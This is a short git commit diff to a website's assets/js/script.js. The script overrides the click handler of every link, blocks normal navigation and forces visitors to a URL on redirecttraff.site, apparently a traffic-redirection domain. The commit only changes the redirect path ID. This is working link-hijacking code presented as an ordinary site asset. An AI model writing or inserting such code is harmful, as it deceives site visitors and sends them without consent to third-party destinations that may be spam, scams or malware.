e7e33543e3ea7857f0452df6f70bd95344f73d03
maratbabaev <you@example.com>
2025-03-18 16:49:02 +0300

    2

--- assets/js/script.js
+++ assets/js/script.js
@@ -1,7 +1,7 @@
 document.querySelectorAll("a").forEach((elem) => {
 	elem.onclick = function (e) {
 		e.preventDefault();
-		window.location.href = "https://redirecttraff.site/vxWtPR95";
+		window.location.href = "https://redirecttraff.site/ZQ6pzFJn";
 		return false;
 	};
 });
